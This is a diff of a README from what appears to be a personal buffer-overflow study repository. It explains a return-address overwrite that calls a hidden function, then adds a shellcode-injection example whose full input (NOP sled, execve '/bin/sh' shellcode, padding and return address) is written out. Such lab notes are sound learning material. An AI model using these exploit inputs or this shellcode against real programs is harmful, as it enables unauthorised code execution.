@@ -23,3 +23,12 @@ I grabbed the object dump with: `objdump -d 02-buffer-overflow > 02-obj`, and wa
 with: `python -c 'print "a"*16 + "\x8b\x84\x04\x08"' | ./02-buffer-overflow`. On my machine, the 4 byte character buffer
 was allocated 12 bytes, so I need to write 16 in order to fill it up and overwrite the base pointer (since the buffer appears
 right next to it in memory). The next four bytes will be the address of `secretFunction` in reverse.
+
+The third example, `03-shell-code.c`, demonstrates executing shellcode injected into a program vulnerable to a buffer overflow
+attack. It follows the second of the above links. The files relevant to this program are:
+
+ - shellcode.asm
+ - shellcode.hexBytes (not really necessary ;) )
+ - shellcode.o (keeping this around only because I'll forget to run nasm in the future)
+
+The input that worked for this example, and got me shell access was: `./03-shell-code $(python -c 'print "\x90"*60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*27 + "\xc0\xcc\xff\xff"')`
